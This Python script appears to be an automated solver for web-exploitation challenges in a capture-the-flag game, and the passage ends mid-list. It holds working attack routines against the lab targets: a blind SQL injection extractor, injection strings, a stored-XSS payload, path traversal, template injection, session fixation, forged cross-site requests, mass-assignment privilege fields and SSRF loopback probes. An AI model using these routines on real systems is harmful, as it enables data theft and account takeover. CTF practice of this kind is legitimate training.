#!/usr/bin/env python3
"""Huntress CTF 2026 - Web Exploitation unified headless solver (API-only).

Solves a web challenge in all 3 modes via the Game Master API using regular
UNTIMED play (run_for_time:false) so there is no 60s clock to race. Handles the
one-live-target-per-team slot by going one attempt at a time and submitting
(which releases the target). Auto-detects the challenge type per target
(backup / idor / sqli) so it is robust to the generator's randomised skins.

Usage:
  webrun.py <base_challenge_id> [--modes single,tt,mastery] [--no-submit]
  webrun.py --day <N>            # solve every web challenge released on day N
  webrun.py --url <target_url>   # debug: just recover a proof from one target
"""
import sys, re, time, json, requests
from concurrent.futures import ThreadPoolExecutor
sys.path.insert(0, "~/ctf")
from gm import GM

UA = {"User-Agent": "ctf-recon"}
PROOF = re.compile(r"proof_[0-9a-fA-F]{16,}")

# ------------------------------------------------------------------ helpers
def _get(s, url, **kw):
    kw.setdefault("timeout", 15)
    for _ in range(3):
        try:
            return s.get(url, **kw)
        except Exception:
            time.sleep(0.4)
    return None

def _post(s, url, **kw):
    kw.setdefault("timeout", 15)
    for _ in range(3):
        try:
            return s.post(url, **kw)
        except Exception:
            time.sleep(0.4)
    return None

def _j(txt):
    """Parse a JSON string, returning {} on any failure."""
    import json
    try:
        return json.loads(txt) if txt else {}
    except Exception:
        return {}

def _clues(url):
    """Fetch /api/clues JSON for the target (used by XSS/session detectors)."""
    s = requests.Session(); s.headers.update(UA)
    r = _get(s, url.rstrip("/") + "/api/clues")
    if r is None:
        return {}
    try:
        return r.json()
    except Exception:
        return {}

def wait_ready(url, limit=160):
    """Poll a target root until it serves its app (not booting/expired)."""
    url = url.rstrip("/")
    t0 = time.time()
    while time.time() - t0 < limit:
        s = requests.Session(); s.headers.update(UA)
        try:
            r = s.get(url + "/", timeout=8)
            if r.status_code == 200 and "<" in r.text and "expired" not in r.text:
                return s, r.text
            if r.status_code in (408, 410) and "expired" in r.text:
                return None, "EXPIRED"
        except Exception:
            pass
        time.sleep(3)
    return None, None

# ------------------------------------------------------------------ type detect
SSTI_PARAMS = ("template", "input", "message", "text", "content", "tpl", "body", "q", "name")

def _probe_ssti(url, feat):
    """Return the reflecting param name if feature_route evaluates {{7*7}} server-side
    (day-11 'Template Temper': Spring Boot renders {{...}} as SpEL). Else None."""
    s = requests.Session(); s.headers.update(UA)
    for p in SSTI_PARAMS:
        r = _get(s, url.rstrip("/") + feat, params={p: "{{7*7}}"})
        if r is not None and (re.search(r">\s*49\s*<", r.text) or "<pre>49</pre>" in r.text):
            return p
    return None

def detect(home, clues=None, url=None):
    """Classify the target. The /api/clues JSON fields are the most reliable
    discriminator for the clue families (day 06-13); fall back to HTML. Days 11-13
    share the generic {feature_route[, secondary_route]} clue shape, so they are
    told apart by a cheap behavioural probe of the live routes (url required)."""
    clues = clues or {}
    # --- clue-driven (day 06 reflected-xss / 07 stored-xss / 08 session-fixation)
    if clues.get("callback_nonce"):
        return "reflect"                      # day-06 "Reflect Upon This"
    if clues.get("session_hint"):
        return "session"                      # day-08 "Session Impression"
    if any(k in clues for k in ("moderator_data_route", "receipt_route_template",
                                "moderation_workflow")):
        return "stored"                       # day-07 "Stored for Later"
    if clues.get("preferences_route") or clues.get("browser_session"):
        return "csrf"                         # day-09 "Forged With Care"
    if any(k in clues for k in ("upload_shape", "upload_policy", "render_route")):
        return "upload"                       # day-10 "Uploading Expectations"
    # --- day-16 OS command injection ('Shell Company', Gin 'Worker Window'):
    # the feature route runs a diagnostic shell command on an input_parameter
    # whose example_path is a real path. Unique clue keys: input_parameter +
    # example_path (no other type exposes these).
    if clues.get("input_parameter") and clues.get("example_path"):
        return "cmdinject"                    # day-16 "Shell Company"
    # --- day-19 forged-webhook trust ('Trust the Webhook', Starlette): the feature
    # route is a webhook receiver that acts on a forged event with NO signature
    # check at all; it only wants a well-formed event body. Unique clue keys:
    # event_type + owner_scope (the event's type/scope to forge). Must be checked
    # before the feature_route block (day-19 has feature_route but no
    # secondary_route, so it would otherwise misdetect as admin/ssti).
    if clues.get("event_type") and clues.get("owner_scope"):
        return "webhook"                      # day-19 "Trust the Webhook"
    # --- day-20 insecure deserialization ('Serialized Offender' / 'Object Post',
    # Quarkus): the feature route deserializes a client-supplied 'state' blob
    # (base64url of JSON) and trusts the role inside it. Unique clue key:
    # state_format_route (describes the blob format). Also has feature_route but no
    # secondary_route, so check before the feature_route block.
    if clues.get("state_format_route"):
        return "deserialize"                  # day-20 "Serialized Offender"
    # --- day-22 unauthorized websocket event stream ('Socket to Me', Koa): the
    # feature route is a WebSocket endpoint (GET -> 426 websocket_upgrade_required);
    # subscribing to the privileged stream_reference has no authz check. Unique clue
    # key: stream_reference (no other type exposes it). Has feature_route but no
    # secondary_route, so check before the feature_route block.
    if clues.get("stream_reference") is not None:
        return "websocket"                    # day-22 "Socket to Me"
    # --- day-23 trusted reverse-proxy header spoof ('Forwarded Misgivings',
    # Micronaut): the feature route derives the client IP from a forwarded header it
    # blindly trusts, gating a loopback-only effect. Unique clue key:
    # deployment (== trusted_reverse_proxy). Also feature_route with no
    # secondary_route, so check before the feature_route block.
    if clues.get("deployment"):
        return "forwarded"                    # day-23 "Forwarded Misgivings"
    # --- day-24 fail-open authorization ('Fail Open Friday', ASP.NET Core Razor
    # Pages): the feature route makes an access decision from a 'remote policy'
    # blob (prefix + base64url JSON). The intended behaviour is to DENY when the
    # policy service is unavailable, but an exception during decode fails OPEN and
    # grants the effect. Unique clue key: policy_format_route (describes the blob).
    # Has feature_route but no secondary_route, so check before the feature_route
    # block.
    if clues.get("policy_format_route"):
        return "failopen"                     # day-24 "Fail Open Friday"
    # --- day-26 supply-chain / signed-manifest integrity bypass ('Trust the Build',
    # Fiber/Go): the feature route activates an update manifest but never re-verifies
    # the artifact bytes against the signed artifact_sha256, so a restricted hook can
    # be swapped in while keeping the original signature. Unique clue keys:
    # update_feed + update_policy. Has feature_route but no secondary_route, so check
    # before the feature_route block.
    if clues.get("update_feed") and clues.get("update_policy"):
        return "trustbuild"                   # day-26 "Trust the Build"
    # --- day-27 SSRF-then-object-authorization ('Internal Affairs', Ktor): the
    # feature route is a server-side case fetcher (?target=<loopback http url>); the
    # internal case service (named by topology_route) returns a case by ?id= with no
    # object-level authz, so SSRF it at the foreign case id. Unique clue keys:
    # case_directory_route + topology_route. Has feature_route but no secondary_route,
    # so check before the feature_route block.
    if clues.get("case_directory_route") and clues.get("topology_route"):
        return "internalaffairs"              # day-27 "Internal Affairs"
    # --- day-28 delegated-identity passthrough trust ('Pass the Identity', Axum):
    # the feature route is a delegated service boundary that blindly trusts a
    # forwarded identity header; presenting the privileged records_owner identity in
    # that header makes the server act as it. Unique clue key:
    # identity_directory_route (/api/identities: {caller, records_owner}). Has BOTH
    # feature_route and secondary_route (both 403 'delegated_identity_rejected' on a
    # bare request), so check BEFORE the feature+secondary block, else the 403
    # secondary route misdetects as massassign.
    if clues.get("identity_directory_route"):
        return "delegidentity"                # day-28 "Pass the Identity"
    # --- day-29 queue owner-binding bypass ('Queue the Confusion', Pyramid): a job
    # is queued with a client-supplied 'owner' and NO check that the caller may act
    # as that owner; queueing owner=<restricted_owner> then reading the job result
    # reveals it. Unique clue key: owner_directory_route (/api/owners: {caller,
    # restricted_owner}). Has BOTH feature_route and secondary_route (the secondary
    # 400s 'job_id_required' on a bare GET), so check BEFORE the feature+secondary
    # block, else it falls through to admin.
    if clues.get("owner_directory_route"):
        return "queuebind"                    # day-29 "Queue the Confusion"
    # --- day-31 Full Stack Incident (Actix): a multi-stage chain reconstructed from
    # a request log -> fetch event -> worker dispatch -> evidence -> detector/repair.
    # Unique clue keys: final_route + request_log_route (also worker_query_field /
    # fetch_query_field / event_json_field). No other challenge exposes these, and it
    # carries feature_route + secondary_route, so check BEFORE the feature+secondary
    # block (its secondary GET is 'event_not_verified', which matches no branch).
    if clues.get("final_route") and clues.get("request_log_route"):
        return "fullstack"                    # day-31 "Full Stack Incident"
    # --- day-17 account-recovery token not bound to account ('Reset Expectations',
    # Symfony). Unique clue key: recovery_guide_route. Must be checked before the
    # feature_route/secondary_route disambiguation block (day-17 carries both).
    if clues.get("recovery_guide_route"):
        return "resettoken"                   # day-17 "Reset Expectations"
    # --- day-18 GraphQL field-level authz bypass ('Resolver Revolt', GraphQL.js):
    # the record resolver returns a protected case's private field without the
    # field-level check the index implies. protected_reference is also used by
    # day-14 apiauthz, so disambiguate FIRST: GraphQL has NO inventory_route and is
    # flagged by framework 'GraphQL', a 'resolver' note, or the current_user key.
    _fw0 = (clues.get("framework") or "").lower()
    _note0 = (clues.get("note") or "").lower()
    if not clues.get("inventory_route") and (
            "graphql" in _fw0
            or ("resolver" in _note0 and clues.get("protected_reference") is not None)
            or (clues.get("protected_reference") is not None and clues.get("current_user") is not None)):
        return "graphql"                      # day-18 "Resolver Revolt"
    if clues.get("inventory_route") or clues.get("protected_reference") is not None:
        return "apiauthz"                     # day-14 "The API Has Opinions"
    feat = clues.get("feature_route")
    sec = clues.get("secondary_route")
    fw = (clues.get("framework") or "").lower()
    # --- days 11-13 all expose feature_route; disambiguate by live behaviour
    if feat and url:
        if sec:
            # day-12 delayed-SQLi ('Ask Again Later', Sinatra: submit a 'filter',
            # read it back from the result route) vs day-13 mass-assignment
            # ('Posted Too Much', NestJS: audit route is 403 until a privileged
            # property is over-posted). The secondary route's GET tells them apart.
            s = requests.Session(); s.headers.update(UA)
            rr = _get(s, url.rstrip("/") + sec)
            body = rr.text.lower() if rr is not None else ""
            code = rr.status_code if rr is not None else 0
            # day-25 log/audit discrepancy ('If a Breach Falls in a Log', Slim):
            # the secondary 'status' route surfaces an audit feed and a 'report'
            # describing a POST comparison whose fields include missing_event /
            # observed_event. A privileged 'protected_export' (done via the feature
            # route) is logged but hidden in the public feed as a benign page_view;
            # the audit comparison reveals that 'decisive security event missing'.
            # The report's field names are a clean, unique discriminator (checked
            # before the credit/ssrf/massassign branches).
            if "missing_event" in body or "observed_event" in body or \
               ("page_view" in body and "export_id" in body):
                return "logaudit"             # day-25 "If a Breach Falls in a Log"
            # day-21 double-spend ('Double Spent', Rails): the audit/secondary route
            # reports credit over/under-spend and gates the proof on credits<0. No
            # other feat+sec type mentions credits/overspend, so this is a clean
            # discriminator (check before the ssrf/massassign 403 branches).
            if "overspent" in body or "credit_unavailable" in body or "credit" in body:
                return "doublespend"          # day-21 "Double Spent"
            if "internal_only" in body or "internal_service" in body:
                return "ssrf"                 # day-15 "Fetch Quest" (SSRF)
            if code == 403 or "administrator_required" in body or "forbidden" in body:
                return "massassign"           # day-13
            if "delayed_query" in body or "private_row" in body or "rows" in body:
                return "delayedsqli"          # day-12
            if "nest" in fw:
                return "massassign"
            if "sinatra" in fw:
                return "delayedsqli"
        else:
            # day-30 'Framework Roulette' forwarded-trust variant: the feature route
            # blindly trusts a forwarded client IP (and, in the two-layer skin, a
            # forwarded role claim). A bare GET reports evaluated_client = our edge IP
            # and a gateway/loopback/forwarded rejection. Detect that behaviourally
            # (no 'deployment' clue here) and route to solve_forwarded.
            sfp = requests.Session(); sfp.headers.update(UA)
            fr = _get(sfp, url.rstrip("/") + feat)
            fb = fr.text.lower() if fr is not None else ""
            if ("evaluated_client" in fb or "gateway_context" in fb
                    or "loopback_only" in fb or "forwarded" in fb):
                return "forwarded"            # day-30 forwarded IP/role trust
            # day-11 SSTI ('Template Temper', Spring Boot {{...}} SpEL) vs day-05
            # admin / broken-access-control ('Administratively Speaking', Django:
            # feature_route served with no server-side authz).
            if "spring" in fw or _probe_ssti(url, feat):
                return "ssti"                 # day-11
            return "admin"                    # day-05
    h = home.lower()
    if "/lookup" in h or ("<form" in h and "search" in h):
        return "sqli"
    # admin / broken-access-control (Django Dispatch): /api/clues -> feature_route
    if feat or "/api/clues" in h or "feature_route" in h or "feature route" in h:
        return "admin"
    # LFI / path-traversal viewer (Runbook Nook / Page Turner): *.php?doc=
    if re.search(r"\.php\?[a-z0-9_]+=", h) or "reader.php" in h or "notes.php" in h:
        return "lfi"
    if "signed in as" in h or "/api/history" in h or "/api/events" in h or "activity feed" in h:
        return "idor"
    if "crawler policy" in h or "snapshots" in h or "status" in h or "uptime" in h or "deployment" in h:
        return "backup"
    return "backup"

# ------------------------------------------------------------------ per-type solve
def solve_backup(url):
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    rb = _get(s, url + "/robots.txt")
    dirs = []
    if rb is not None:
        dirs = [m.group(1) for m in re.finditer(r"(?im)^\s*Disallow:\s*(\S+)", rb.text)]
    for d in dirs + ["/"]:
        if not d.startswith("/"):
            d = "/" + d
        idx = _get(s, url + d)
        if idx is None:
            continue
        m = PROOF.search(idx.text)
        if m:
            return m.group(0)
        for href in re.findall(r'href="([^"]+)"', idx.text):
            if href.startswith(("http", "//", "#")) or "/assets/" in href:
                continue
            u = href if href.startswith("/") else d.rstrip("/") + "/" + href
            rr = _get(s, url + u)
            if rr is not None:
                m2 = PROOF.search(rr.text)
                if m2:
                    return m2.group(0)
    return None

def solve_idor(url):
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    home = _get(s, url + "/")
    if home is None:
        return None
    feeds = [h for h in re.findall(r'href="([^"]+)"', home.text) if h.startswith("/api/")]
    caseseg = None
    for h in re.findall(r'href="(/[a-z]+/\d+)"', home.text):
        caseseg = h.rsplit("/", 1)[0].strip("/"); break
    foreign = []
    for f in feeds:
        r = _get(s, url + f)
        if r is None:
            continue
        try:
            j = r.json()
        except Exception:
            continue
        cur = j.get("current_user")
        for e in j.get("events", []) or []:
            if e.get("owner") and e.get("owner") != cur:
                foreign.append(e.get("case_id"))
    cands = []
    for cid in foreign:
        if caseseg:
            cands.append("/api/%s/%s" % (caseseg, cid))
        cands += ["/api/incidents/%s" % cid, "/api/briefs/%s" % cid,
                  "/api/cases/%s" % cid, "/api/records/%s" % cid]
    seen = set()
    for p in cands:
        if p in seen:
            continue
        seen.add(p)
        r = _get(s, url + p)
        if r is not None:
            m = PROOF.search(r.text)
            if m:
                return m.group(0)
    return None

def solve_sqli(url):
    url = url.rstrip("/")
    sess = requests.Session(); sess.headers.update(UA)
    home = _get(sess, url + "/")
    if home is None:
        return None
    m = re.search(r"action=['\"]([^'\"]+)['\"]", home.text)
    action = m.group(1) if m else "/lookup"

    def search(val, s=None):
        s = s or sess
        r = _get(s, url + action, params={"q": val})
        return r.text if r is not None else ""

    vis = re.findall(r"Record ([0-9]+)", search("%"))
    if not vis:
        vis = re.findall(r"Record ([0-9]+)", search("' OR '1'='1"))
    if not vis:
        return None
    anchor = vis[0]
    notid = " AND ".join("id<>%s" % v for v in vis)

    def truth(B, s=None):
        q = "zxq%' OR ((" + B + ") AND id=" + anchor + ") OR '1'='1"
        return ("Record " + anchor) in search(q, s)

    if not truth("1=1") or truth("1=2"):
        return None

    # find the data table (first non-sqlite table); default 'articles'
    def ext_str(expr, workers=12):
        # length
        lo, hi = 0, 220
        while lo < hi:
            mid = (lo + hi) // 2
            if truth("length((%s))<=%d" % (expr, mid)):
                hi = mid
            else:
                lo = mid + 1
        n = lo
        if n == 0:
            return ""
        def ch(i):
            s = requests.Session(); s.headers.update(UA)
            a, b = 32, 126
            while a < b:
                mid = (a + b) // 2
                if truth("unicode(substr((%s),%d,1))<=%d" % (expr, i, mid), s):
                    b = mid
                else:
                    a = mid + 1
            return i, chr(a)
        res = [None] * n
        with ThreadPoolExecutor(max_workers=workers) as ex:
            for i, c in ex.map(ch, range(1, n + 1)):
                res[i - 1] = c
        return "".join(res)

    tbl = "articles"
    if not truth("(SELECT COUNT(*) FROM articles)>=0"):
        tbl = ext_str("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' LIMIT 1")
    for col in ["summary", "note", "body", "description", "content", "title", "detail"]:
        if not truth("(SELECT COUNT(%s) FROM %s)>=0" % (col, tbl)):
            continue
        val = ext_str("SELECT %s FROM %s WHERE %s LIMIT 1" % (col, tbl, notid))
        m = PROOF.search(val or "")
        if m:
            return m.group(0)
    return None

def solve_lfi(url):
    """Path-traversal viewer: GET <viewer>.php?<param>=../../../run/huntress/objective.txt"""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    home = _get(s, url + "/")
    htext = home.text if home is not None else ""
    m = re.search(r"([A-Za-z0-9_]+\.php)\?([A-Za-z0-9_]+)=", htext)
    ep = "/" + (m.group(1) if m else "reader.php")
    pm = m.group(2) if m else "doc"
    targets = ["run/huntress/objective.txt"]
    for depth in (8, 10, 12, 6, 16, 20):
        for tgt in targets:
            r = _get(s, url + ep, params={pm: ("../" * depth) + tgt})
            if r is None:
                continue
            mm = PROOF.search(r.text)
            if mm:
                return mm.group(0)
    return None

def solve_admin(url):
    """Broken access control: /api/clues -> feature_route served with no real authz."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    fr = None
    r = _get(s, url + "/api/clues")
    if r is not None:
        try:
            fr = r.json().get("feature_route")
        except Exception:
            pass
    home = _get(s, url + "/")
    htext = home.text if home is not None else ""
    cands = []
    if fr:
        cands.append(fr)
    cands += re.findall(r'href="(/[A-Za-z0-9_\-]+(?:-[0-9a-f]{4,})?)"', htext)
    seen = set()
    for p in cands:
        if not p or p in seen:
            continue
        seen.add(p)
        if not p.startswith("/"):
            p = "/" + p
        for r in (_get(s, url + p), (lambda: s.post(url + p, timeout=12))()):
            if r is not None:
                m = PROOF.search(r.text)
                if m:
                    return m.group(0)
    return None

def solve_reflect(url):
    """Day-06 reflected XSS ('Reflect Upon This', Fastify 'Search Mirror').
    /api/clues gives feature_route (reflecting /execute-<hex>), secondary_route
    (the /callback-<hex>) and callback_nonce. The callback returns the proof only
    when hit with ?nonce=<nonce> AND a Referer pointing at the reflecting page
    (the server's stand-in for 'the injected script fired from the execute page').
    No real browser needed."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    nonce = clues.get("callback_nonce")
    cb = clues.get("secondary_route") or clues.get("callback_route")
    execute = clues.get("feature_route") or "/"
    if not (nonce and cb):
        return None
    for ref in (url + execute, url + "/"):
        for pname in ("nonce", "callback_nonce", "token"):
            r = _get(s, url + cb, params={pname: nonce}, headers={"Referer": ref})
            if r is not None:
                m = PROOF.search(r.text)
                if m:
                    return m.group(0)
    return None

def solve_stored(url):
    """Day-07 stored XSS ('Stored for Later', FastAPI 'Feedback Loop').
    /api/clues gives moderator_data_route (proof, moderator-only) and
    receipt_route_template (/api/messages/{id}/evidence-<hex>). Submit a note whose
    stored HTML fires in the moderator's authenticated browser, reads the moderator
    data route, and POSTs it back to this message's evidence route; the proof then
    appears as the message receipt on /messages/{id}."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    support = clues.get("moderator_data_route")
    tmpl = clues.get("receipt_route_template")
    if not (support and tmpl):
        return None
    api = tmpl.split("{")[0].rstrip("/")           # -> /api/messages
    js = ("fetch('%s').then(function(r){return r.text()}).then(function(t){"
          "var p=location.pathname.split('/').filter(Boolean);var id=p[p.length-1];"
          "fetch('%s'.replace(/\\{[^}]+\\}/,id),{method:'POST',"
          "headers:{'Content-Type':'application/json'},body:JSON.stringify({evidence:t})})})"
          % (support, tmpl))
    payload = '<img src=x onerror="%s">' % js
    r = _post(s, url + api, json={"message": payload})
    if r is None:
        return None
    try:
        j = r.json()
        detail = j.get("url") or ("/messages/%s" % j.get("id"))
    except Exception:
        return None
    for _ in range(25):                             # reviewer bot visits within ~15s
        time.sleep(3)
        rr = _get(s, url + detail)
        if rr is not None:
            m = PROOF.search(rr.text)
            if m:
                return m.group(0)
    return None

def solve_session(url):
    """Day-08 session fixation ('Session Impression', Laravel 'Resume Room').
    /api/clues gives feature_route (/action-<hex>, which blindly sets the
    arena_session cookie to a caller-chosen ?sid=), secondary_route (/status-<hex>,
    the authenticated page holding the proof) and session_hint (the id the victim's
    authenticated session uses). Plant sid=session_hint, then read status with that
    fixed session to inherit the victim's login."""
    url = url.rstrip("/")
    clues = _clues(url)
    action = clues.get("feature_route")
    status = clues.get("secondary_route")
    hint = clues.get("session_hint")
    if not (action and status and hint):
        return None
    for pname in ("sid", "session_id", "session", "token", "sessionId"):
        s = requests.Session(); s.headers.update(UA)
        r = _get(s, url + action, params={pname: hint})
        if r is not None and ("session_established" in r.text or r.status_code == 200):
            rs = _get(s, url + status)
            if rs is not None:
                m = PROOF.search(rs.text)
                if m:
                    return m.group(0)
    # fallback: set the session cookie directly
    s = requests.Session(); s.headers.update(UA)
    s.cookies.set("arena_session", hint)
    rs = _get(s, url + status)
    if rs is not None:
        m = PROOF.search(rs.text)
        if m:
            return m.group(0)
    return None

def solve_csrf(url):
    """Day-09 CSRF ('Forged With Care', ASP.NET Core MVC 'Notification Nook').
    /api/clues gives feature_route (the state-changing submit route) and
    preferences_route (a form whose GET action changes a saved 'destination').
    The form carries a hidden csrf_token, but the server does NOT validate it; a
    plain 'arena_session' cookie (set on any page load) authenticates the victim.
    The proof is gated behind the request looking genuinely cross-site: send the
    state-change to the submit route with a non-default destination and header
    'Sec-Fetch-Site: cross-site' (the server's stand-in for a forged cross-origin
    request). It then sets changed_across_sites=true and reveals 'evidence' at
    /api/preferences. No real browser needed."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    prefs = clues.get("preferences_route")
    feature = clues.get("feature_route")
    if not prefs:
        return None
    _get(s, url + "/")                                 # establish arena_session cookie
    pr = _get(s, url + prefs)
    htext = pr.text if pr is not None else ""
    m = re.search(r"action=['\"]([^'\"]+)['\"]", htext)
    action = m.group(1) if m else (feature or "")
    sm = re.search(r"<select[^>]*\bname=['\"]([^'\"]+)['\"]", htext)
    selname = sm.group(1) if sm else "destination"
    cm = re.search(r"[Cc]urrent destination:\s*<strong>([^<]+)</strong>", htext)
    current = cm.group(1).strip() if cm else "daily"
    opts = re.findall(r"<option value=['\"]([^'\"]+)['\"]", htext)
    ext = next((o for o in opts if o != current and o.lower() != "daily"), None)
    if ext is None and opts:
        ext = opts[-1]
    if not action or ext is None:
        return None
    if not action.startswith("/"):
        action = "/" + action
    hdr = {"Sec-Fetch-Site": "cross-site", "Origin": "https://evil.example",
           "Referer": "https://evil.example/"}
    _get(s, url + action, params={selname: ext}, headers=hdr)
    for probe in ("/api/preferences", action):
        r = _get(s, url + probe)
        if r is not None:
            mm = PROOF.search(r.text)
            if mm:
                return mm.group(0)
    return None

def solve_upload(url):
    """Day-10 upload->SSTI ('Uploading Expectations', Go net/http 'File Counter').
    /api/clues gives feature_route (POST JSON {filename,content,content_type}),
    render_route (serves the stored file) and an upload_policy ('only .txt /
    text/plain'). The filter is nominal: a file whose name ends in '.html' is
    served as a staff HTML *template* regardless of content_type, and templates
    evaluate double-brace fields like {{objective}} (the attempt proof). So upload
    content '{{objective}}' as an .html note, then open its render path."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    feature = clues.get("feature_route")
    render = clues.get("render_route")
    if not feature:
        return None
    field = "objective"
    pg = clues.get("preview_guide")
    if pg:
        r = _get(s, url + pg)
        if r is not None:
            m = (re.search(r"objective is\s*<code>([A-Za-z0-9_]+)</code>", r.text)
                 or re.search(r"field name[^<]*<code>([A-Za-z0-9_]+)</code>", r.text))
            if m:
                field = m.group(1)
    fname = "exploit.html"
    body = {"filename": fname, "content": "{{%s}}" % field, "content_type": "text/plain"}
    r = _post(s, url + feature, json=body)
    path = None
    if r is not None:
        try:
            path = r.json().get("path")
        except Exception:
            path = None
    cands = []
    if path:
        cands.append(path if path.startswith("/") else "/" + path)
    if render:
        cands.append(render + "?file=" + fname)
    for p in cands:
        rr = _get(s, url + p)
        if rr is not None:
            m = PROOF.search(rr.text)
            if m:
                return m.group(0)
    return None

def solve_ssti(url):
    """Day-11 server-side template injection ('Template Temper', Spring Boot
    'Message Mill'). /api/clues gives feature_route; it renders a 'template'
    parameter and evaluates {{...}} as SpEL ({{7*7}} -> 49, {{T(java.lang.System)}}
    -> class java.lang.System). The attempt proof is bound in the render context as
    the variable 'objective', so {{objective}} prints proof_... directly. No RCE
    needed. The reflecting param name and proof variable are found by probing."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    feat = clues.get("feature_route")
    if not feat:
        return None
    param = _probe_ssti(url, feat)
    if not param:
        for p in SSTI_PARAMS:                       # last resort: any reflecting param
            r = _get(s, url + feat, params={p: "ZZprobeZZ"})
            if r is not None and "ZZprobeZZ" in r.text:
                param = p; break
    if not param:
        return None
    for expr in ("{{objective}}", "{{proof}}", "{{flag}}", "{{secret}}", "{{message}}"):
        r = _get(s, url + feat, params={param: expr})
        if r is not None:
            m = PROOF.search(r.text)
            if m:
                return m.group(0)
    return None

def solve_delayed_sqli(url):
    """Day-12 deferred SQL injection ('Ask Again Later', Sinatra 'Report Replay').
    /api/clues gives feature_route (POST a report query) and secondary_route (read
    the result later). The POST stores a 'filter' value that is concatenated into
    WHERE visibility='<filter>'; the result route runs it and returns the matching
    note rows. Only a 'public' row shows normally; inject to also reveal the private
    row holding the proof. Submit the injected filter, then read the result."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    feat = clues.get("feature_route"); sec = clues.get("secondary_route")
    if not (feat and sec):
        return None
    payloads = ["public' OR '1'='1' -- ", "' OR '1'='1' -- ", "x' OR '1'='1' -- ",
                "public' OR 1=1 -- ", "' OR 1=1 -- ", "a' OR 'a'='a' -- "]
    for fld in ("filter", "q", "query", "where", "search", "visibility", "report", "status"):
        for pl in payloads:
            if _post(s, url + feat, json={fld: pl}) is None:
                continue
            rr = _get(s, url + sec)
            if rr is not None:
                m = PROOF.search(rr.text)
                if m:
                    return m.group(0)
    return None

# common names a mass-assignment ('over-posting') endpoint might bind to elevate
_MASS_PRIV = {
    "role": "administrator", "user_role": "administrator", "account_type": "administrator",
    "type": "administrator", "level": "administrator", "clearance": "administrator",
    "privilege": "administrator", "access": "administrator", "scope": "administrator",
    "group": "administrators", "roles": ["administrator"], "permissions": ["admin"],
    "is_admin": True, "isAdmin": True, "admin": True, "administrator": True,
    "is_administrator": True, "staff": True, "trusted": True, "approved": True,
    "owner": True, "superuser": True, "elevated": True, "privileged": True,
    "visibility": "private",
}

def solve_massassign(url):
    """Day-13 mass assignment / over-posting ('Posted Too Much', NestJS
    'Profile Binder'). /api/clues gives feature_route (POST a profile update) and
    secondary_route (an audit route that is 403 'administrator_required' for an
    analyst). The profile binder blindly binds every posted field, so over-posting
    a privileged property (role/is_admin/...) flips the account to administrator;
    the audit route then returns the proof. Post the superset of common privileged
    field names (randomised per variant), then read the audit route."""
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    feat = clues.get("feature_route"); sec = clues.get("secondary_route")
    if not (feat and sec):
        return None
    body = {"display_name": "x", "name": "x"}
    body.update(_MASS_PRIV)
    _post(s, url + feat, json=body)
    rr = _get(s, url + sec)
    if rr is not None:
        m = PROOF.search(rr.text)
        if m:
            return m.group(0)
    # fallback: some variants key on string "true" rather than JSON booleans
    body2 = {"display_name": "x", "name": "x"}
    for k, v in _MASS_PRIV.items():
        body2[k] = v if not isinstance(v, bool) else "true"
    _post(s, url + feat, json=body2)
    rr = _get(s, url + sec)
    if rr is not None:
        m = PROOF.search(rr.text)
        if m:
            return m.group(0)
    return None

def solve_apiauthz(url):
    """Day-14 API field/action authorization bypass ('The API Has Opinions',
    Jakarta Servlet on Tomcat 'WAR Room'). /api/clues gives feature_route,
    inventory_route and protected_reference; /api/inventory lists the accepted
    query_parameters (id/fields/action), the field names, the action names and a
    public 'sample' tuple. The server's trust decision only blesses the public
    (id, field, action) tuple and returns 403 'field_action_forbidden' when any
    single axis is raised, but the COMBINATION of the protected reference with the
    privileged field AND the privileged action slips through the gap and returns
    'api_field_action_authorization_bypassed'. Brute the small id x field x action
    cross-product (<=8 GETs), trying the non-sample (privileged) value of each axis
    first, and return the proof."""
    import itertools
    url = url.rstrip("/")
    s = requests.Session(); s.headers.update(UA)
    clues = _clues(url)
    feat = clues.get("feature_route")
    if not feat:
        return None
    inv_route = clues.get("inventory_route") or "/api/inventory"
    pr = clues.get("protected_reference")
    fields, actions, pub, samp = [], [], None, {}
    r = _get(s, url + inv_route)
    if r is not None:
        try:
            inv = r.json()
            fields = list(inv.get("fields") or [])
            actions = list(inv.get("actions") or [])
            pub = inv.get("public_reference")
            samp = inv.get("sample") or {}
        except Exception:
            pass
    if not fields:
        fields = ["note", "title"]
    if not actions:
        actions = ["export", "view"]
    if not samp:
        samp = {"id": pub if pub is not None else pr, "fields": "title", "action": "view"}
    ids = [i for i in (pr, pub) if i is not None] or [pr]
    # map each sample key to its candidate values, privileged (non-sample) first
    axes = {}
    for k, v in samp.items():
        if isinstance(v, int) or (isinstance(v, str) and v.isdigit()):
            vals = [x for x in dict.fromkeys(ids) if x is not None]
            axes[k] = vals or [v]
        elif v in fields:
            axes[k] = sorted(dict.fromkeys(fields), key=lambda x, s=v: x == s)
        elif v in actions:
            axes[k] = sorted(dict.fromkeys(actions), key=lambda x, s=v: x == s)
        else:
            axes[k] = [v]
    keys = list(axes.keys())
    for combo in itertools.product(*(axes[k] for k in keys)):
        params = {k: combo[i] for i, k in enumerate(keys)}
        rr = _get(s, url + feat, params=params)
        if rr is not None:
            m = PROOF.search(rr.text)
            if m:
                return m.group(0)
    return None

# internal targets an SSRF fetcher can reach over loopback (host x port)
_SSRF_BASES = [
    "http://127.0.0.1:8080", "http://localhost:8080",
    "http://127.0.0.1:5000", "http://localhost:5000",
    "http://127.0.0.1:8000", "http://localhost:8000",
    "http://127.0.0.1:3000", "http://localhost:3000",
    "http://127.0.0.1:80", "http://localhost:80",
    "http://127.0.0.1", "http://localhost",
